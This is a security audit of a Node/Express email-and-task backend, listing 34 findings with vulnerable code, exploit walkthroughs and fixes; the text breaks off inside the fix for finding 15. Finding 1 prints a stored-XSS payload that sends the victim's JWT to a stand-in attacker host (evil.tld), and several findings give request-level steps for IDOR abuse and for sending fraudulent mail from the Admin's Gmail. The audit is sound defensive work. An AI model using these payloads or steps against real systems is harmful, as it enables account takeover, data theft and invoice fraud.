# MailDesk / K M KOTHARI — Backend Correctness, Bugs & Security Audit

Scope: everything under `server/` (index.js, controllers, models, routes, middleware, utils, config, seeders, scripts, .env.example, .gitignore) plus `README.md` for intent, plus the three client render sinks that consume server-stored email HTML.

Stack verified from `node_modules`: express **5.2.1**, zod **4.4.3**, mongoose **9.6.3**, express-mongo-sanitize 2.x, jsonwebtoken 9.x, socket.io 4.x.

Every finding below was verified by reading the code; several were additionally proven by running the actual installed libraries (see "Proof" blocks). Anything I could not fully confirm is explicitly marked **UNVERIFIED**.

Roles: `Admin` (single, full control), `Head` (connects own Gmail, creates/assigns tasks), `Employee` (sees only assigned work).

---

## Severity summary

| # | Severity | Title |
|---|---|---|
| 1 | CRITICAL | Stored XSS → account takeover: raw Gmail HTML rendered in `allow-scripts allow-same-origin` iframe |
| 2 | CRITICAL | `replyToEmail` — any Head can send mail **from the Admin's Gmail mailbox** to any address (no ownership check + explicit admin-credential fallback) |
| 3 | HIGH | Registration returns a working JWT to a `Pending` (unapproved) account — approval gate bypass |
| 4 | HIGH | `protect` never checks `status`; rejecting/suspending a user does not revoke their token (valid 7 more days) |
| 5 | HIGH | Every Zod validation failure returns **500 Internal Server Error** — `validate.js` uses `error.errors`, removed in Zod 4 |
| 6 | HIGH | `deleteComment` IDOR — comment id is not bound to the task in the URL; delete any comment in the system |
| 7 | HIGH | `bulkAssignEmails` IDOR — a Head can assign *any* email (incl. Admin's) and receives its full body back |
| 8 | HIGH | Keyword-approval endpoints leak/mutate every mailbox in the workspace to any Head |
| 9 | HIGH | `deduplicateConnections()` silently destroys Gmail connections, and runs on every `GET /api/gmail/status` |
| 10 | HIGH | `deleteSingleEmail` — no ownership check; a Head can delete any Admin/other Head email |
| 11 | HIGH | `createTask` `linkedEmail` IDOR — read any email body and hijack its assignment |
| 12 | MEDIUM | Deadlines parsed in **server** timezone; date-only deadlines become UTC midnight → instantly "Late" |
| 13 | MEDIUM | Admin `maxConnectedAccounts` / `allowedGmailAccounts` silently discarded (Zod strips them) |
| 14 | MEDIUM | `forgot-password` immediately overwrites the victim's password → unauthenticated account-lockout DoS |
| 15 | MEDIUM | `PUT /api/tasks/:id` has **no** validation — type confusion → 500s, arbitrary field writes |
| 16 | MEDIUM | `getEmailTimeline` `?days=` unbounded → event-loop DoS |
| 17 | MEDIUM | Employees can read & complete any **unassigned** task (null-assignee check bypass) |
| 18 | MEDIUM | `uncaughtException` handler keeps a corrupted process alive; `connectDB` swallows failure |
| 19 | MEDIUM | Recurrence: month-overflow deadline bug + double-spawn race + spawn-before-save |
| 20 | MEDIUM | Audit gaps — user create/update/delete (incl. role escalation) and all client CRUD are not logged |
| 21 | MEDIUM | `express-mongo-sanitize` on `req.query` is a **no-op** under Express 5 |
| 22 | MEDIUM | Login/forgot-password user enumeration |
| 23 | MEDIUM | No `trust proxy` → all rate limiting collapses to one shared bucket behind a proxy |
| 24 | MEDIUM | `ensureTaskForEmail` falls back to `clients[0].name` — wrong client on every unmatched email |
| 25 | MEDIUM | `GET /api/clients` loads every task and every email into memory; Employee-accessible |
| 26 | MEDIUM | `decrypt()` fails open — returns ciphertext as if it were a token |
| 27 | LOW | `oauth2Client.on('tokens')` async handler → `ParallelSaveError` / unhandled rejection |
| 28 | LOW | Startup cleanup in `config/db.js` mass-resets email assignment state on every boot |
| 29 | LOW | Zod `errorMap` ignored in v4 → generic messages |
| 30 | LOW | No pagination anywhere; `getEmails` returns every full HTML body |
| 31 | LOW | Weak password policy (6 chars), bcrypt cost 10, `Bearer` prefix matched with `startsWith` |
| 32 | LOW | `res.status(550)` — invalid HTTP status; AI endpoint usable as a free LLM proxy |
| 33 | LOW | Temp-password generator has modulo bias |
| 34 | INFO | `.env` correctly gitignored and untracked; secrets are real (not placeholders) but short |

---

# Findings

---

## 1. CRITICAL — Stored XSS from inbound email → full account takeover

**Files:**
- Sink: `client/src/pages/TaskList.jsx:1156` and `client/src/pages/TaskList.jsx:1742`
- Source: `server/controllers/gmailController.js:349-354` (server stores raw HTML, never sanitizes)
- Served by: `server/controllers/taskController.js:91` / `:240` (`.populate('linkedEmail', 'subject from body attachments')`)

**Vulnerable code — server stores attacker-controlled HTML verbatim:**
```js
// gmailController.js:349
const rawBody = getBodyText(payload);          // prefers text/html (line 49)
let decodedBody = '';
if (rawBody) {
  const base64Body = rawBody.replace(/-/g, '+').replace(/_/g, '/');
  decodedBody = Buffer.from(base64Body, 'base64').toString('utf-8');
}
...
const emailRecord = new Email({ ..., body: decodedBody, ... });   // line 423 — no sanitization
```

**Vulnerable code — client sink:**
```jsx
// TaskList.jsx:1154-1156
srcDoc={renderEmailContent(task.linkedEmail.body)}
title="Linked Email"
sandbox="allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox"
```

`renderEmailContent` (TaskList.jsx / EmailInbox.jsx:6-13) passes HTML through **completely unmodified** when `/<[a-z][\s\S]*>/i` matches:
```js
const styledBody = isHtml ? body : `<div ...>${escaped}</div>`;
```

**Exploit:**
1. Anyone on the internet emails a connected company mailbox with `Content-Type: text/html` and body:
   `<img src=x onerror="fetch('https://evil.tld/?t='+localStorage.token+'&u='+localStorage.user)">`
2. The 10-minute cron (`utils/cronJobs.js:74`) ingests it; a keyword rule or a Head assigns it to a task.
3. Any Admin/Head/Employee opens the task in TaskList.
4. `allow-scripts` **+** `allow-same-origin` together nullify the sandbox — the frame runs script *in the parent's origin*. `client/src/api/axios.js:14` keeps the JWT in `localStorage`, which is same-origin.
5. Attacker receives a 7-day Admin JWT → full workspace takeover (all mailboxes, all users, `DELETE /api/gmail/emails`).

Note `EmailInbox.jsx:1343` uses `sandbox="allow-same-origin allow-popups ..."` **without** `allow-scripts` — that path is safe. Only TaskList is exploitable, which is where Employees view their work.

**Fix (do both):**
- Server: sanitize on ingest with a hardened allowlist (`isomorphic-dompurify` / `sanitize-html`) before `new Email({ body })`, stripping `<script>`, `<iframe>`, `on*` attributes, `javascript:`/`data:` URLs, `<style>`, `<base>`, `<form>`.
- Client: remove `allow-same-origin` from both TaskList iframes (keep `sandbox="allow-popups allow-popups-to-escape-sandbox"`). `allow-scripts` + `allow-same-origin` must never appear together on untrusted content. Additionally move the JWT out of `localStorage` into an `HttpOnly; Secure; SameSite=Strict` cookie.

---

## 2. CRITICAL — `replyToEmail`: any Head can send email *from the Admin's Gmail account*

**File:** `server/controllers/gmailController.js:870-981`
**Route:** `server/routes/gmailRoutes.js:38` — `router.post('/emails/:id/reply', protect, authorizeRoles('Admin','Head'), validate(replyToEmailSchema), replyToEmail)`

**Vulnerable code:**
```js
// gmailController.js:880-881 — NO ownership check on the email at all
const email = await Email.findById(emailId);
if (!email) return res.status(404).json({ message: 'Email not found.' });
...
// gmailController.js:903-919 — and if you don't own the inbox, borrow the Admin's credentials
// If this user doesn't own the inbox, find the Admin who does
if (!accessToken) {
  const allAdmins = await User.find({ role: 'Admin' }).select('+gmailAccessToken +gmailRefreshToken +linkedGmailAccounts');
  for (const admin of allAdmins) {
    if (admin.gmailEmail === targetInbox) {
      accessToken = admin.gmailAccessToken;
      refreshToken = admin.gmailRefreshToken;
      break;
    }
    ...
  }
}
...
// gmailController.js:951-972
const rawLines = [ `From: ${targetInbox}`, `To: ${toAddress}`, ... ];
await gmail.users.messages.send({ userId: 'me', requestBody: { raw: encodedEmail, ... } });
```

**Exploit:**
1. A Head enumerates email ids. `GET /api/gmail/emails` is scoped by `fetchedBy` for a Head, but ids are 24-hex ObjectIds and leak freely via `GET /api/keyword-rules/pending-approvals` (finding 8), which returns **every** pending email in the workspace including `_id`, `from`, `subject`, `body`.
2. `POST /api/gmail/emails/<adminOwnedEmailId>/reply` with `{"replyBody":"Please wire the payment to IBAN ..."}`.
3. Ownership is never checked. `email.toEmail` is the Admin's mailbox, so the Head's own credentials don't match, the fallback loop kicks in, and the message is sent **from the Admin's real Gmail account** to `email.from` — an arbitrary external address the attacker chose by picking the email.
4. The reply lands in the Admin's Sent folder and the real thread, making it indistinguishable from the Admin's own mail. Ideal BEC / invoice-fraud primitive.

**Fix:**
```js
// After loading the email, enforce object-level ownership:
if (req.user.role !== 'Admin') {
  if (!email.fetchedBy || email.fetchedBy.toString() !== req.user._id.toString()) {
    return res.status(403).json({ message: 'Access denied. This email does not belong to your mailbox.' });
  }
}
```
and **delete the admin-credential fallback block entirely** (lines 903-919). A user must only ever act with credentials for a mailbox they personally connected. Apply the same removal to the identical fallback in `downloadAttachment` (`gmailController.js:1109-1125`).

**Related, MEDIUM, same function — header injection (partially UNVERIFIED):**
```js
// gmailController.js:948, 951-961
const replySubject = email.subject.startsWith('Re:') ? email.subject : `Re: ${email.subject}`;
const rawLines = [ `From: ${targetInbox}`, `To: ${toAddress}`, `Subject: ${replySubject}`, ... ];
```
`email.subject` and `email.from` come from attacker-controlled inbound headers and are interpolated straight into an RFC-2822 message with no CRLF stripping. If the Gmail API ever surfaces a header value containing `\r\n` (e.g. via an encoded-word that decodes to a newline), the attacker injects `Bcc:` into every reply. I could not confirm that the Gmail API returns un-normalized header values, so this specific vector is **UNVERIFIED** — but the missing `.replace(/[\r\n]+/g, ' ')` on `toAddress`, `replySubject`, `originalMessageId` and `references` is a real defect regardless.

---

## 3. HIGH — Registration hands a working JWT to an unapproved (`Pending`) account

**File:** `server/controllers/authController.js:46-85`

**Vulnerable code:**
```js
// authController.js:46
let status = 'Pending'; // Self-registered users require Admin approval
...
// authController.js:65-85
const savedUser = await newUser.save();
const token = generateToken(savedUser);      // ← issued unconditionally
...
return res.status(201).json({ token, user: userResponse });
```

`loginUser` blocks `Pending` (line 118-120), but **register does not**, and `protect` (`middleware/authMiddleware.js:7-44`) never looks at `status` — grep confirms `user.status` is referenced only in `authController.loginUser` and `userController.updateUser`.

**Exploit:** `POST /api/auth/register {"name":"x","email":"x@y.z","password":"aaaaaa"}` → 201 with a 7-day `Employee` JWT. Attacker immediately uses it against every `protect`-only endpoint: `GET /api/tasks`, `GET /api/tasks/clients`, `GET /api/clients` (which dumps every client + derived counts over the whole email corpus), `GET /api/notifications`, `PUT /api/tasks/:id` on any unassigned task (finding 17), `GET /api/gmail/status`, and `POST /api/tasks/:id/comments`. Admin approval is decorative.

**Fix:**
```js
// authController.js — do not mint a token for a non-approved account
if (status !== 'Approved') {
  return res.status(201).json({ message: 'Registration submitted. An administrator must approve your account before you can sign in.' });
}
const token = generateToken(savedUser);
return res.status(201).json({ token, user: userResponse });
```
and add the defence-in-depth check in `protect` (see finding 4).

---

## 4. HIGH — `protect` ignores `status`; rejecting or suspending a user does not revoke their session

**Files:** `server/middleware/authMiddleware.js:20-34`, `server/controllers/userController.js:141-194`, `server/index.js:142-167`

**Vulnerable code:**
```js
// authMiddleware.js:20-34
const decoded = jwt.verify(token, process.env.JWT_SECRET);
req.user = await User.findById(decoded.id).select('-password');
if (!req.user) { return res.status(401).json({ message: 'Not authorized. User not found.' }); }
if (req.user.tokenVersion !== undefined && decoded.tokenVersion !== req.user.tokenVersion) {
  return res.status(401).json({ message: 'Not authorized. Token has been revoked.' });
}
next();                    // ← no status check, no role re-check
```
```js
// userController.js:160 — status flips, but tokenVersion is untouched
user.status = status;
```

**Exploit:** An employee is fired. Admin sets `status: 'Rejected'` via `PUT /api/users/:id`. The user's existing JWT (issued with `expiresIn: '7d'`, `authController.js:16`) keeps working for up to 7 days against every endpoint, including the Socket.io channel (`index.js:150-158`, same omission). Same for demoting a Head to Employee: the DB `role` is re-read on each request so `authorizeRoles` does update, but the account remains fully usable.

**Fix:**
```js
// authMiddleware.js, after the tokenVersion check
if (req.user.status !== 'Approved') {
  return res.status(403).json({ message: 'Account is not active.' });
}
```
Mirror it in the Socket.io `io.use` handler (`index.js:150`). And in `userController.updateUser`, bump `user.tokenVersion += 1` whenever `status` moves away from `Approved` **or** `role` changes, so live sessions are invalidated immediately. Also shorten `expiresIn` to ~1h and add a refresh token.

---

## 5. HIGH — Every Zod validation failure returns 500 instead of 400 (Zod 4 removed `ZodError.errors`)

**File:** `server/middleware/validate.js:12-19`

**Vulnerable code:**
```js
} catch (error) {
  if (error instanceof ZodError) {
    // Return first validation error message in format { message: "..." }
    const firstError = error.errors[0]?.message || 'Validation failed.';   // ← error.errors is undefined in zod 4
    return res.status(400).json({ message: firstError });
  }
  next(error);
}
```

**Proof (run against the project's own `node_modules`, zod 4.4.3):**
```
instanceof ZodError: true
typeof e.errors: undefined undefined
THROWS: TypeError Cannot read properties of undefined (reading '0')
```
End-to-end through Express 5 with the project's real `loginSchema`:
```
POST /login {"email":"notanemail","password":"x"}
ERRHANDLER: TypeError Cannot read properties of undefined (reading '0')
STATUS: 500 BODY: {"message":"Internal Server Error"}
```
The `?.` optional chain does not help — `error.errors` itself is `undefined`, so indexing `[0]` throws. Because `validate` is synchronous, Express catches the throw and routes it to the global handler (`index.js:107-113`), which masks all 5xx as `Internal Server Error`.

**Blast radius — every validated route is affected:** `POST /api/auth/register`, `/login`, `/forgot-password`; `POST /api/users`, `PUT /api/users/:id`, `PUT /api/users/profile`, `PUT /api/users/change-password`; `POST /api/tasks`, `POST /api/tasks/bulk`; `POST /api/gmail/emails/:id/reply`, `/emails/bulk-assign`, `DELETE /api/gmail/linked-account`. A user typing a bad email or a 5-character password sees "Internal Server Error" and no guidance. It also silently converts every legitimate 400 into a 500 in logs and monitoring.

Sending **no body at all** to a validated POST is the same story: `express.json()` leaves `req.body` `undefined`, `schema.parse(undefined)` raises `ZodError`, → 500.

**Fix:**
```js
const validate = (schema) => (req, res, next) => {
  const result = schema.safeParse(req.body);
  if (!result.success) {
    return res.status(400).json({ message: result.error.issues[0]?.message || 'Validation failed.' });
  }
  req.body = result.data;
  next();
};
```
(`.issues` is the Zod 4 accessor; `safeParse` removes the throw path entirely.)

---

## 6. HIGH — IDOR in `deleteComment`: the comment id is never bound to the task in the URL

**File:** `server/controllers/commentController.js:123-147`
**Route:** `server/routes/commentRoutes.js:7`, mounted at `server/index.js:79` as `/api/tasks/:id/comments`

**Vulnerable code:**
```js
// commentController.js:125-141
const comment = await TaskComment.findById(req.params.commentId);   // ← taskId never compared to req.params.id
if (!comment) return res.status(404).json({ message: 'Comment not found.' });

const isOwner = comment.author.toString() === req.user._id.toString();

let isAuthorized = false;
if (isOwner) { isAuthorized = true; }
else if (req.user.role === 'Admin') { isAuthorized = true; }
else if (req.user.role === 'Head') {
  // Heads can only delete comments on tasks created by them
  const task = await Task.findById(req.params.id);          // ← authorization uses the URL task, deletion uses a different one
  if (task && task.createdBy && task.createdBy.toString() === req.user._id.toString()) {
    isAuthorized = true;
  }
}
if (!isAuthorized) { return res.status(403).json({ message: 'Access denied.' }); }
await TaskComment.findByIdAndDelete(req.params.commentId);
```

The Head branch authorizes against `Task.findById(req.params.id)` but deletes `req.params.commentId` — two unrelated documents. Classic confused-deputy.

**Exploit:** Head *H* creates one throwaway task `T_own`. Comment ids are returned to any participant of any shared task, and are sequential-ish ObjectIds. `DELETE /api/tasks/<T_own>/comments/<anyCommentId>` → authorization passes (H created `T_own`), and an arbitrary comment on the Admin's private task is destroyed. Repeat to wipe the entire `taskcomments` collection. There is no soft-delete and no audit entry for deletions, so the loss is silent and unrecoverable.

**Fix:**
```js
const comment = await TaskComment.findById(req.params.commentId);
if (!comment) return res.status(404).json({ message: 'Comment not found.' });
if (comment.taskId.toString() !== req.params.id) {
  return res.status(404).json({ message: 'Comment not found.' });   // bind child to parent
}
const task = await Task.findById(comment.taskId);   // authorize against the comment's OWN task
```
Also gate the `isOwner` branch on the caller still having access to the task, and add `logActivity` for deletions.

---

## 7. HIGH — `bulkAssignEmails` IDOR: a Head can assign, and read, any mailbox's emails

**File:** `server/controllers/gmailController.js:986-1057`
**Route:** `server/routes/gmailRoutes.js:41` (`authorizeRoles('Admin','Head')`)

**Vulnerable code:**
```js
// gmailController.js:1005 — no fetchedBy / ownership predicate
const emails = await Email.find({ _id: { $in: emailIds } });
...
// gmailController.js:1015-1025
const task = new Task({
  title: email.subject || 'Assigned Email',
  description: email.body || '',          // ← full raw HTML body copied into the task
  linkedEmail: email._id,
  assignedTo: assignee._id,
  ...
});
const savedTask = await task.save();
createdTasks.push(savedTask);
...
// gmailController.js:1049-1052 — and echoed straight back to the caller
return res.status(200).json({ message: ..., tasks: createdTasks });
```

**Exploit:** A Head posts `{"emailIds":["<any 24-hex id>", ...],"assignedTo":"<their own userId>"}`. Ids for other mailboxes are freely obtainable from `GET /api/keyword-rules/pending-approvals` (finding 8) or by brute-forcing the ObjectId counter within a known timestamp window. The response contains `description` = the **complete email body** for every id — the Admin's private mail exfiltrated in one request. As a bonus the Admin's inbox is mutated (`email.status = 'assigned'`, `email.assignedTo` reassigned, lines 1030-1032).

**Fix:**
```js
const scope = { _id: { $in: emailIds } };
if (req.user.role !== 'Admin') scope.fetchedBy = req.user._id;
const emails = await Email.find(scope);
if (emails.length !== emailIds.length) {
  return res.status(403).json({ message: 'One or more emails are outside your mailbox.' });
}
```
Also cap `emailIds` length in `bulkAssignEmailsSchema` (`.max(200)`) and stop echoing `description` back.

---

## 8. HIGH — Keyword-approval endpoints expose and mutate every mailbox in the workspace

**File:** `server/controllers/keywordRuleController.js:172-311`
**Routes:** `server/routes/keywordRuleRoutes.js:15-33` — the entire router is `authorizeRoles('Admin','Head')` with **no per-object scoping anywhere**.

**Vulnerable code:**
```js
// keywordRuleController.js:174-177 — every pending email, workspace-wide, full documents
const pendingEmails = await Email.find({ approvalStatus: 'pending' })
  .populate('suggestedAssignedTo', 'name email role')
  .populate('fetchedBy', 'name email')
  .sort({ date: -1 });
```
```js
// keywordRuleController.js:192 — approve ANY email by id
const email = await Email.findById(req.params.id);
...
email.assignedTo = assignedUserId;
email.status = 'assigned';
```
```js
// keywordRuleController.js:255-260 — bulk-approve everything pending, any mailbox
let query = { approvalStatus: 'pending' };
if (keyword) query.matchedKeyword = keyword.toUpperCase();
const pendingEmails = await Email.find(query);
```

**Exploit:**
- `GET /api/keyword-rules/pending-approvals` as a Head returns full `Email` documents — `_id`, `from`, `subject`, **`body`**, `toEmail`, `attachments` — for the Admin's and every other Head's mailbox. This is both a direct data breach and the id-oracle that makes findings 2, 7, 10 and 11 practical.
- `POST /api/keyword-rules/bulk-approve {"targetUserId":"<attacker userId>"}` (no `keyword`) assigns **every pending email in the company** to the attacker and creates linked Tasks whose `description` is the (tag-stripped, 1000-char) body — `utils/taskHelper.js:47-49`.
- `POST /api/keyword-rules` lets any Head create a rule with `autoApprove: true` for a broad keyword (e.g. `"THE"`), which retroactively rewrites `assignedTo` on every matching unassigned email in the workspace (`keywordRuleController.js:71-93`) and auto-creates tasks carrying their content.
- `PUT`/`DELETE /api/keyword-rules/:id` (lines 109, 149) let a Head silently rewrite or delete the Admin's routing rules — `createdBy` is stored but never enforced.

**Fix:** Scope every query by `fetchedBy` for non-Admins:
```js
const scope = { approvalStatus: 'pending' };
if (req.user.role !== 'Admin') scope.fetchedBy = req.user._id;
```
Restrict rule mutation to `Admin` or `rule.createdBy === req.user._id`. Restrict `autoApprove: true` to `Admin`. Require `keyword` (or an explicit `all: true` plus Admin role) on bulk-approve so an empty body cannot sweep the workspace. Project away `body` in the approvals list.

---

## 9. HIGH — `deduplicateConnections()` silently destroys Gmail connections, on every status poll

**File:** `server/controllers/gmailController.js:814-864`; invoked at `:284` (OAuth callback) and `:633` (**`GET /api/gmail/status`**)

**Vulnerable code:**
```js
const users = await User.find({}).select('+gmailAccessToken +gmailRefreshToken +linkedGmailAccounts');
const seenEmails = new Set();
for (const u of users) {
  const hasPrimary = !!u.gmailAccessToken || !!u.gmailEmail;
  if (hasPrimary) {
    const emailLower = (u.gmailEmail || "").toLowerCase().trim();
    if (!emailLower || seenEmails.has(emailLower)) {
      u.gmailAccessToken = null;
      u.gmailRefreshToken = null;
      u.gmailEmail = "";
      modified = true;
```

**Failure scenario:** Two Heads legitimately connect the same shared mailbox (`accounts@company.com`), or one Head has it primary while another has it linked. On the *next* `GET /api/gmail/status` — a route the dashboard polls — whichever user `User.find({})` returns second has their tokens **hard-deleted**, with no notification, no audit entry, and no way to tell it from an expired grant. `User.find({})` has no `.sort()`, so the victim is decided by MongoDB's natural order and can flip between requests, producing an oscillating "connected / disconnected" state.

Secondary: the function loads **all** users with decryptable tokens and issues a `save()` per modified user on every status poll — a write amplification on a read endpoint. And its errors are swallowed (`catch` at line 861 only logs), so this destructive path is invisible.

**Fix:** Remove the call from `getConnectedStatus` entirely — a read endpoint must not mutate. Make de-duplication an explicit, Admin-triggered maintenance action (or a startup migration), have it *report* conflicts rather than delete tokens, and enforce uniqueness at the source instead: reject the OAuth callback when `gmailAddress` is already claimed by another user, with a clear error.

---

## 10. HIGH — `deleteSingleEmail`: no ownership check

**File:** `server/controllers/gmailController.js:607-625`
**Route:** `server/routes/gmailRoutes.js:47` (`authorizeRoles('Admin','Head')`)

**Vulnerable code:**
```js
const emailId = req.params.id;
const email = await Email.findById(emailId);
if (!email) { return res.status(404).json({ message: "Email not found" }); }

await Email.findByIdAndDelete(emailId);        // ← no fetchedBy check
await Task.updateMany({ linkedEmail: emailId }, { $set: { linkedEmail: null } });
```

**Exploit:** Any Head iterates ids from `pending-approvals` (finding 8) and hard-deletes the Admin's emails one by one. The `Email` model has no soft-delete flag, so the record and its `body` are gone permanently; any Task that referenced it loses `linkedEmail`, silently orphaning the evidence for the work item.

**Fix:**
```js
if (req.user.role !== 'Admin' && (!email.fetchedBy || email.fetchedBy.toString() !== req.user._id.toString())) {
  return res.status(403).json({ message: 'Access denied. This email is not in your mailbox.' });
}
```
Consider a `deletedAt` soft-delete field instead of `findByIdAndDelete`.

---

## 11. HIGH — `createTask` `linkedEmail` IDOR: read any email body, hijack its assignment

**File:** `server/controllers/taskController.js:14-73`
**Route:** `server/routes/taskRoutes.js:30` (`authorizeRoles('Admin','Head')`)

**Vulnerable code:**
```js
// taskController.js:27 — linkedEmail taken from the request with zero validation
linkedEmail: linkedEmail || null,
...
// taskController.js:43-48 — and the referenced email is mutated
if (linkedEmail) {
  await Email.findByIdAndUpdate(linkedEmail, { status: 'assigned', assignedTo: assignedTo });
}
...
// taskController.js:51-54 — then its body is populated back into the response
const populatedTask = await Task.findById(savedTask._id)
  .populate('assignedTo', 'name email')
  .populate('linkedEmail', 'subject from body attachments')
```
`createTaskSchema` (`middleware/schemas.js:81`) declares `linkedEmail: z.string().nullable().optional()` — a bare string, never checked for existence, ownership, or ObjectId shape.

**Exploit:** A Head posts `{"title":"x","clientName":"x","assignedTo":"<self>","deadline":"2026-09-01T10:00","linkedEmail":"<Admin's email id>"}` and the 201 response contains that email's `subject`, `from`, **`body`** and `attachments`. As a side effect the Admin's email is flipped to `assigned` and reassigned to the attacker's chosen user. `assignedTo` is likewise never verified to be an existing user, so an invalid value produces a Mongoose CastError → 500 (finding 15).

**Fix:**
```js
let linkedEmailDoc = null;
if (linkedEmail) {
  const scope = { _id: linkedEmail };
  if (req.user.role !== 'Admin') scope.fetchedBy = req.user._id;
  linkedEmailDoc = await Email.findOne(scope);
  if (!linkedEmailDoc) return res.status(403).json({ message: 'Linked email not found or not in your mailbox.' });
}
const assignee = await User.findById(assignedTo);
if (!assignee) return res.status(400).json({ message: 'Assignee not found.' });
```
Tighten the schema: `linkedEmail: z.string().regex(/^[0-9a-fA-F]{24}$/).nullable().optional()`.

---

## 12. MEDIUM — Deadlines are parsed in the *server's* timezone; date-only deadlines are instantly overdue

**Files:** `server/controllers/taskController.js:30` and `:209`, `server/utils/cronJobs.js:18-23`, `server/models/Task.js:27-30`

**Vulnerable code:**
```js
// taskController.js:30 — raw client string handed to Mongoose
deadline,
// taskController.js:209
if (deadline !== undefined) task.deadline = deadline;
```
```js
// cronJobs.js:18-22 — compared against server "now"
const now = new Date();
const overdueTasks = await Task.find({ status: 'Pending', deadline: { $lt: now } });
```
`createTaskSchema` types `deadline` as a plain `z.string().min(1)` (`middleware/schemas.js:78`) — no format constraint, no `z.coerce.date()`.

**Failure scenario (two distinct bugs):**
1. **Offset shift.** The client sends a `datetime-local` value with no timezone designator, e.g. `"2026-08-05T17:00"` (see `client/src/pages/TaskList.jsx:1458` / `:437`). Per ECMAScript, a date-*time* string without an offset is interpreted as **local time of the machine doing the parsing** — here, the Node server. Deploy the API in UTC while the team works in IST (+05:30) and every deadline lands 5.5 hours later than the user chose. `TaskList.jsx:437` compounds it by round-tripping through `.toISOString().slice(0,16)`, so the edit form shows the UTC wall clock, not what was entered.
2. **Date-only → UTC midnight.** Any bare `"2026-08-05"` is spec-mandated to parse as **UTC** midnight = 05:30 IST. The every-minute cron (`cronJobs.js:14`) then flips a task due "today" to `Late` at 05:30 local, before anyone starts work — and fires a notification to the assignee *and* to every Admin and Head (`cronJobs.js:58-64`).

**Fix:** Make the timezone explicit end-to-end. Client sends a full ISO-8601 with offset (`new Date(input).toISOString()`). Server validates and coerces:
```js
deadline: z.coerce.date().refine(d => d > new Date(), 'Deadline must be in the future')
```
If date-only deadlines must be supported, normalize to end-of-day in a configured business timezone (`process.env.APP_TIMEZONE`), not UTC midnight. Do not accept unvalidated strings into a `Date` path.

---

## 13. MEDIUM — Admin cannot actually set `maxConnectedAccounts` or `allowedGmailAccounts` (Zod silently strips them)

**Files:** `server/middleware/schemas.js:30-39`, `server/middleware/validate.js:9-10`, `server/controllers/userController.js:100-118`

**Vulnerable code:**
```js
// schemas.js:30-39 — neither field is declared
const updateUserSchema = z.object({
  name: ..., email: ..., role: ..., status: ...
});
```
```js
// validate.js:9-10
const parsed = schema.parse(req.body);
req.body = parsed; // Use parsed data (strips unknown keys, coerces types)
```
```js
// userController.js:100, 108-118 — reads fields that can never be present
const { name, email, role, status, maxConnectedAccounts, allowedGmailAccounts } = req.body;
if (maxConnectedAccounts !== undefined) { ... }
if (allowedGmailAccounts !== undefined) { ... }
```

**Proof (zod 4.4.3, project's own module):**
```
z.object({name: z.string().optional()}).parse({name:'a', role:'Admin', maxConnectedAccounts:9})
→ {"name":"a"}
```
Unknown keys are stripped by default, so both branches are dead code.

**Failure scenario:** An Admin restricts a Head to 1 Gmail account and whitelists `finance@company.com`. `PUT /api/users/:id` returns 200 and the UI shows success, but nothing is persisted. The Head keeps the default `maxConnectedAccounts: 5` (`models/User.js:52-55`), and the `allowedList.length > 0` guard in the OAuth callback (`gmailController.js:233-236`) is never satisfied, so the Head can connect **any** Gmail account. A security control that reports success while doing nothing is worse than no control.

**Fix:** Add both to `updateUserSchema`:
```js
maxConnectedAccounts: z.coerce.number().int().min(0).max(50).optional(),
allowedGmailAccounts: z.union([z.array(z.string().email()), z.string()]).optional(),
```
(Note the same stripping is *load-bearing and correct* for `updateUserProfileSchema` — it is what prevents self-service `role` mass-assignment on `PUT /api/users/profile`. Do **not** loosen that one.)

---

## 14. MEDIUM — `forgot-password` overwrites the victim's password immediately: unauthenticated lockout DoS

**File:** `server/controllers/authController.js:155-226`

**Vulnerable code:**
```js
// authController.js:181-191
const tempPassword = generateTempPassword();
const salt = await bcrypt.genSalt(10);
const hashedPassword = await bcrypt.hash(tempPassword, salt);

user.password = hashedPassword;                       // ← destructive, before any user confirmation
user.tokenVersion = (user.tokenVersion || 0) + 1;     // ← and kills every live session
await user.save();
```

**Failure scenario:** Anyone who knows an employee's email address posts `{"email":"victim@company.com"}` up to 10 times per 15 minutes per IP (`index.js:52`). Each call replaces the victim's real password and increments `tokenVersion`, which the `protect` check at `authMiddleware.js:30` and the socket check at `index.js:156` both enforce — so the victim is logged out mid-task and their known password no longer works. They must go dig the temp password out of their inbox. Rotating source IPs turns this into a permanent denial of service for the whole company. The generated password is also emailed in cleartext, never expires, has no single-use semantics, and no `mustChangePassword` flag forces rotation — an old reset email remains a valid credential indefinitely.

**Fix:** Do not mutate the account on request. Store a hashed, single-use, short-lived reset token:
```js
const raw = crypto.randomBytes(32).toString('hex');
user.resetTokenHash = crypto.createHash('sha256').update(raw).digest('hex');
user.resetTokenExpires = Date.now() + 15 * 60 * 1000;
await user.save();      // password untouched
// email the link: `${FRONTEND_URL}/reset-password?token=${raw}`
```
Only on `POST /api/auth/reset-password` (token valid, unexpired, unused) set the new password, clear the token, and bump `tokenVersion`.

---

## 15. MEDIUM — `PUT /api/tasks/:id` has no validation at all

**File:** `server/controllers/taskController.js:140-250`; route `server/routes/taskRoutes.js:34` — `.put(protect, updateTask)`, no `validate(...)`

**Vulnerable code:**
```js
// taskController.js:206-214
if (title !== undefined) task.title = title.trim();
if (description !== undefined) task.description = description.trim();
if (clientName !== undefined) task.clientName = clientName.trim();
if (deadline !== undefined) task.deadline = deadline;
if (notes !== undefined) task.notes = notes.trim();
if (status !== undefined) task.status = status;
if (priority !== undefined) task.priority = priority;
if (isRecurring !== undefined) task.isRecurring = isRecurring;
if (recurrence !== undefined) task.recurrence = recurrence || null;
```

**Failure scenarios (all reachable by any Admin/Head, and partly by Employees):**
- `{"title": 123}` → `title.trim is not a function` → TypeError → caught at line 246 → **500** with a useless message. Same for `description`, `clientName`, `notes` with numbers, arrays or `null`.
- `{"status":"Archived"}` → passes the controller, fails Mongoose enum validation on `save()` → 500 instead of a 400 naming the allowed values.
- `{"deadline":"not-a-date"}` → CastError on save → 500. `{"deadline":null}` clears the deadline, permanently removing the task from overdue tracking (`cronJobs.js:21` cannot match a null against `$lt: Date`).
- `{"assignedTo":"garbage"}` → CastError → 500, after `Email.findByIdAndUpdate` at line 221 has possibly already run — a partial write.
- `{"title":"<10 MB string>"}` → no length bound anywhere on `title`, `description`, `notes`, `clientName` (the only `maxlength` in the whole schema layer is `TaskComment.message: 1000`). `express.json()`'s 100 kB default is the sole backstop.

**Fix:** Add an `updateTaskSchema` and wire it up:
```js
const updateTaskSchema = z.object({
  title: z.string().trim().min(1).max(300).optional(),
